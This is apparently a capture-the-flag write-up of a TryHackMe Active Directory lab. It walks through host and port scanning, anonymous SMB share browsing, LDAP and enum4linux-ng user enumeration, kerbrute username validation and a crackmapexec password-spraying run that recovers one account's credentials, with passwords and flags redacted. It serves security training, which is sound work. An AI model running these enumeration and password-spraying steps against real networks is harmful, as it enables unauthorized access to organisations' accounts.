## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Learn how to enumerate an Active Directory network and get initial access.
We've just been given VPN access to an Active Directory network. We don't have any credentials yet; only our attacking machine is equipped with the greatest and latest tools. Our goal is to discover the structure of the Active Directory environment, identify hosts and services, and map out the network. Let's imagine for a second that we don't have a nice network diagram, and are given the following subnet as part of our scope: `10.211.11.0/24`
```

## IP-Address
- Its an network so we get IP-Address dynamically so we will just moving ahead identifying the network targets 
## Network Scan 
```bash
$ fping -agq 10.211.11.0/24
10.211.11.10
10.211.11.20
10.211.11.250
```

## Analysis 
- These are the hosts which is present in the `Network`.
- Where `10.211.11.250` refers to be the entry `VPN-Server`
- So our `Targets` will be 
```bash
$ cat Hosts.txt
10.211.11.10
10.211.11.20
```

Lets start with `10.211.11.10` First
## RustScan 
```bash
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 57:d9:ac:9e:bc:f9:27:c9:8a:7f:01:28:72:9f:05:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeoeP2eltxWU/ayaI/YXEuJXiCQPeQjWyOBax3kFKr8MWY58yjUUa9B1iypjIwrGU54gBd+nhUA/G65zgvWhAu6Vu6xDdC+ezokVxzvpm/mkdEGVZOHnKuA7j/sKhf5xYtduMJRjNHYtJCYE2UQqK9NdhXaM5IS8w5ID9DzYdntf08MBf4s+jH37+6nVd3cn7i7ov2ZpAYWQg90NfECSVlD6+fHWaq5fF7pylT0yvOe6YqhLmHYDTUzKAEYHOsuytDURIuffOxivg1df3Rp40aUezjyYR9Andz4/CKSYxf0oXIs7zSiFB85LcP6P04dC7FsFrAG5JZJgEMUwGFW7YX
|   256 bc:21:8a:c6:9f:71:dc:8f:b7:e9:6b:71:71:cd:eb:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMmuYghxNpY6H4eDCq/peYdUzTD8YQC7gOk56ctewe/N/bgIenwYSGMs3wHWL93qc45yg2FHKdNobufLA6WC5o=
|   256 76:ba:01:61:c4:69:5b:c4:d6:8a:dd:8d:c7:32:7b:f3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHhnd63Kd4U5zV9kaJqfDlDcRNIG0nRjGNG4W6bafxUn
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-01 02:15:03Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-01-01T02:16:12+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: TRYHACKME
|   NetBIOS_Domain_Name: TRYHACKME
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: tryhackme.loc
|   DNS_Computer_Name: DC.tryhackme.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-01T02:16:01+00:00
| ssl-cert: Subject: commonName=DC.tryhackme.loc
| Issuer: commonName=DC.tryhackme.loc
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-28T19:57:29
| Not valid after:  2026-06-29T19:57:29
| MD5:   9533:5193:509a:532a:e4df:20fb:11d5:c868
| SHA-1: 656b:6021:c098:ba2b:e3fc:e359:517a:df8b:83c1:530a
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQdAlvs4rruJVOVFFxC1GAUDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBEQy50cnloYWNrbWUubG9jMB4XDTI1MTIyODE5NTcyOVoXDTI2
| MDYyOTE5NTcyOVowGzEZMBcGA1UEAxMQREMudHJ5aGFja21lLmxvYzCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOzS86rK/SXnl5n0UKF/VSsPXdxY0kee
| F+upRF9CvKVFKo8tkvSjp/1vvIWDb4jcxUDvV7C6BcptetpiNo21HcxkL0wnbVq0
| Becwk+C9J1dauokB+jBkLgPxM1vInIOwodnF9cKbsDf5bdZT4teEO4Ji2zpljWzc
| atjnS5SaFQsVVFLshk9ZgU71opBS9vOrihIcaT/6ExsqktCnpzzfyD/NNmOQtocX
| OlfCEYBwbTmBSpXcVkDmsVYqFzBA7ozqBxj8sx/g4imt6BLdR9Tzy5ohHAWgXxFQ
| q00W+aLKPC1WY3iFLDCx6HAcDLDaubwTTPdmlymqkax5eT2TzWEdtOECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQDf1CpKJm1N9BMA8uepKCvNWDOyzWzjrjPCI5xlhqIVYubshKI7rjzf
| HgLrBDnsmEQfK3bJyR2hBrZUVZLHT/ab0pCzk0FbS7zrZ8dU+kAEHhuu5qPgLt0e
| TSbFeZfMx90paCGjOakXgbzrn59X2RD5RReQX/XMTpZAG0kCIIIsmzu8ytV4wu1I
| Ej4aSM6baw51u9izUV/3YIuLzX8eB96Q1ILUrOAGZ/HUZbPYtxoOTZwY+rRrpkYB
| kb8B/mT3mCfEOqxcB+09Rt2ss0odNfvxha/S3KmLa34dNjlZSFg1YtejqKu3S46/
| ntiGBbQojTMEaxxt7xo09XjTKWjba8I4
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## 🧠 Active Directory Identification

### 🏷️ Domain Details (from LDAP & RDP)

```yaml
Domain Name        : tryhackme.loc
NetBIOS Domain     : TRYHACKME
Computer Name      : DC
DNS Hostname       : DC.tryhackme.loc
OS                 : Windows Server 2019 Datacenter
```

## SMB Enumeration
```bash
$ smbclient -L //10.211.11.10/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnonShare       Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SharedFiles     Disk
        SYSVOL          Disk      Logon server share
        UserBackups     Disk
```

- Lets Check the Default one and Created ones
```bash
$ smbmap -H 10.211.11.10

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
[+] IP: 10.211.11.10:445      Name: 10.211.11.10          Status: Authenticated
Disk                                         Permissions     Comment
 ----                                        -----------     -------
ADMIN$                                       NO ACCESS       Remote Admin
AnonShare                                    READ, WRITE
C$                                           NO ACCESS       Default share
IPC$                                         NO ACCESS       Remote IPC
NETLOGON                                     NO ACCESS       Logon server share
SharedFiles                                  READ, WRITE
SYSVOL                                       NO ACCESS       Logon server share
UserBackups                                  READ, WRITE
[|] Closing connections..
```

- Lets Enumerate the `ShareFiles`
```bash
$ smbclient  //10.211.11.10/SharedFiles -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Dec 31 21:48:17 2025
  ..                                  D        0  Wed Dec 31 21:48:17 2025
  Mouse_and_Malware.txt               A     1141  Thu May 15 05:40:19 2025

                7863807 blocks of size 4096. 3473321 blocks available
smb: \> Get Mouse_and_Malware.exe
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Mouse_and_Malware.exe
smb: \> Get Mouse_and_Malware.txt
getting file \Mouse_and_Malware.txt of size 1141 as Mouse_and_Malware.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

##### File Content
```bash
$ cat Mouse_and_Malware.txt 
**The Mouse and the Malware**
A curious Mouse lived in the server room of a great company. Though small, he was clever and always nosing about. One day, while sniffing near a terminal, he spotted something strange�a shiny USB drive left dangling from a port.
The Mouse scampered up and tapped it.
"Who left you here?" he asked.
"I am a Gift," whispered the USB drive slyly. "Plug me in, and I will show you secrets, shortcuts, and shiny tools you�ve never seen. Admin access is just a click away."
The Mouse hesitated. "But the humans say not to trust strange devices."
"Pfft," said the USB. "They just want to keep the good stuff for themselves."
Tempted by promises of forbidden knowledge, the Mouse nudged the drive deeper into the port. Instantly, red lights flashed. The screen turned black. Alarm bells rang across the building. From the shadows, a Malware rat emerged, grinning.
"Thanks for the access, little one," it sneered, as it disappeared into the system.
Guards rushed in. Technicians cursed. The Mouse squeaked and fled into a crack in the wall, ashamed.
He never went near a dangling USB again.                                           
```
Define The External Malware Injection 
- Looking other shares too
```bash
$ smbclient  //10.211.11.10/AnonShare -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Dec 31 21:48:14 2025
  ..                                  D        0  Wed Dec 31 21:48:14 2025

7863807 blocks of size 4096. 3473318 blocks available
smb: \> exit

┌──(kali㉿kali)-[~]
└─$ smbclient  //10.211.11.10/UserBackups -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Dec 31 21:48:19 2025
  ..                                  D        0  Wed Dec 31 21:48:19 2025
  flag.txt                            A       14  Thu May 15 05:34:33 2025
  story.txt                           A      953  Thu May 15 05:37:57 2025

 7863807 blocks of size 4096. 3473061 blocks available
smb: \> Get flag.txt
getting file \flag.txt of size 14 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get story.txt
getting file \story.txt of size 953 as story.txt (1.3 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \>
```

- Got the Files
```bash
$ cat story.txt 
**The Fox and the Drone**
A hungry Fox wandered through the edge of a village, where he saw a shining object buzzing above the farmer''s field.
It was a Drone�swift, sleek, and humming with pride. It hovered effortlessly in the air, taking photos of the world below.
"Why walk when I can fly?" the Drone called down. "Look at you, stuck on the ground, always searching for scraps. I see everything from above and never get my paws dirty."
The Fox narrowed his eyes. "Impressive. But do you ever land?"
"Why would I?" scoffed the Drone. "Up here, I�m untouchable!"
Just then, its battery warning blinked red.
The Drone started descending, slower than it liked, until it landed clumsily in the middle of the field. Before it could take off again, the farmer�s curious dog came trotting over, teeth bared.
The Fox chuckled from the hedges.
"Seems the sky�s not so safe after all," he murmured, and trotted off in search of supper.

$ cat flag.txt             
[flag omitted] 
```

- Lets Explore more Options 
```bash
$ ldapsearch -x -H ldap://10.211.11.10 -s base
# extended LDIF
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
domainFunctionality: 6
forestFunctionality: 6
domainControllerFunctionality: 7
rootDomainNamingContext: DC=tryhackme,DC=loc
ldapServiceName: tryhackme.loc:dc$@TRYHACKME.LOC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=tryhackme,DC=loc
schemaNamingContext: CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
namingContexts: DC=tryhackme,DC=loc
namingContexts: CN=Configuration,DC=tryhackme,DC=loc
namingContexts: CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
namingContexts: DC=DomainDnsZones,DC=tryhackme,DC=loc
namingContexts: DC=ForestDnsZones,DC=tryhackme,DC=loc
isSynchronized: TRUE
highestCommittedUSN: 135334
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=tryhackme,DC=loc
dnsHostName: DC.tryhackme.loc
defaultNamingContext: DC=tryhackme,DC=loc
currentTime: 20260101035127.0Z
configurationNamingContext: CN=Configuration,DC=tryhackme,DC=loc
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```
##### Next User Name Enumeration
```bash
$ enum4linux-ng -A 10.211.11.10 -oA results.txt 
ENUM4LINUX - next generation (v1.3.7)
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.211.11.10
[*] Username ......... ''
[*] Random Username .. 'gzhbjdaj'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)
 =====================================
|    Listener Scan on 10.211.11.10    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
 ====================================================
|    Domain Information via LDAP for 10.211.11.10    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: tryhackme.loc
 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.211.11.10    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out
 =========================================
|    SMB Dialect Check on 10.211.11.10    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                
SMB 1.0: true
SMB 2.0.2: true
SMB 2.1: true
SMB 3.0: true
SMB 3.1.1: true
Preferred dialect: SMB 3.0                                                         SMB1 only: false                                                                   SMB signing required: true                                                         
 ===========================================================
|    Domain Information via SMB session for 10.211.11.10    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                          NetBIOS domain name: TRYHACKME                                                     DNS domain: tryhackme.loc                                                          FQDN: DC.tryhackme.loc                                                             Derived membership: domain member                                                  Derived domain: TRYHACKME                                                           =========================================
|    RPC Session Check on 10.211.11.10    |
 =========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
.......

$ cat results.txt.yaml | grep username
    username: Administrator
    username: Guest
    username: krbtgt
    username: sshd
    username: gerald.burgess
    username: nigel.parsons
    username: guy.smith
    username: jeremy.booth
    username: barbara.jones
    username: marion.kay
    username: kathryn.williams
    username: danny.baker
    username: gary.clarke
    username: daniel.turner
    username: debra.yates
    username: jeffrey.thompson
    username: martin.riley
    username: danielle.lee
    username: douglas.roberts
    username: dawn.bolton
    username: danielle.ali
    username: michelle.palmer
    username: katie.thomas
    username: jennifer.harding
    username: strategos
    username: empanadal0v3r
    username: drgonz0
    username: strate905
    username: krbtgtsvc
    username: asrepuser1
    username: rduke
    username: user
```

- Save this into a new file 
```bash
$ cat users.txt
Administrator
Guest
krbtgt
sshd
gerald.burgess
nigel.parsons
guy.smith
jeremy.booth
barbara.jones
marion.kay
kathryn.williams
danny.baker
gary.clarke
daniel.turner
debra.yates
jeffrey.thompson
martin.riley
danielle.lee
douglas.roberts
dawn.bolton
danielle.ali
michelle.palmer
katie.thomas
jennifer.harding
strategos
empanadal0v3r
drgonz0
strate905
krbtgtsvc
asrepuser1
rduke
user
```

## Kerbros
```bash
$ kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt                            
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/31/25 - Ronnie Flathers @ropnop

2025/12/31 22:42:25 >  Using KDC(s):
2025/12/31 22:42:25 >   10.211.11.10:88

2025/12/31 22:42:25 >  [+] VALID USERNAME:       sshd@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       barbara.jones@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       guy.smith@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       gerald.burgess@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       nigel.parsons@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       jeremy.booth@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       debra.yates@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       danny.baker@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       daniel.turner@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       gary.clarke@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       jeffrey.thompson@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       rduke@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       danielle.lee@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       kathryn.williams@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       user@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       martin.riley@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       strategos@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       empanadal0v3r@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       jennifer.harding@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       danielle.ali@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       douglas.roberts@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       strate905@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       drgonz0@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       asrepuser1@tryhackme.loc
2025/12/31 22:42:25 >  [+] VALID USERNAME:       krbtgtsvc@tryhackme.loc
2025/12/31 22:42:25 >  Done! Tested 32 usernames (25 valid) in 0.704 seconds
```

Got The Mails & Valid Usernames, Lets Go for the pass-pool 

## Crackmapexec
```bash
$crackmapexec smb 10.211.11.10 --pass-pol
$ crackmapexec smb 10.211.11.10 --pass-pol
SMB         10.211.11.10    445    DC               [*] Windows Server 2019 Datacenter 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True)
SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
SMB         10.211.11.10    445    DC               Minimum password length: 7
SMB         10.211.11.10    445    DC               Password history length: 24
SMB         10.211.11.10    445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.211.11.10    445    DC
SMB         10.211.11.10    445    DC               Password Complexity Flags: 000001
SMB         10.211.11.10    445    DC                   Domain Refuse Password Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Store Cleartext: 0
SMB         10.211.11.10    445    DC                   Domain Password Lockout Admins: 0
SMB         10.211.11.10    445    DC                   Domain Password No Clear Change: 0
SMB         10.211.11.10    445    DC                   Domain Password No Anon Change: 0
SMB         10.211.11.10    445    DC                   Domain Password Complex: 1
SMB         10.211.11.10    445    DC
SMB         10.211.11.10    445    DC               Minimum password age: 1 day 4 minutes
SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 2 minutes
SMB         10.211.11.10    445    DC               Locked Account Duration: 2 minutes
SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
SMB         10.211.11.10    445    DC               Forced Log off Time: Not Set
```

Got the Necessary Details, Lets Attack for Password
```bash
$crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\gary.clarke:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\gary.clarke:P@ssword STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\gary.clarke:Pa55word1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\daniel.turner:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\daniel.turner:Password1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\daniel.turner:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\daniel.turner:P@ssword STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\daniel.turner:Pa55word1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\debra.yates:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\debra.yates:Password1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\debra.yates:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\debra.yates:P@ssword STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\debra.yates:Pa55word1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\user:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\user:Password1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\user:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\user:P@ssword STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\user:Pa55word1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\rduke:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [-] tryhackme.loc\rduke:Password1 STATUS_LOGON_FAILURE
SMB         10.211.11.10    445    DC               [+] tryhackme.loc\rduke:[password omitted]
```

Got the Credentials `rduke:[password omitted]`

# End 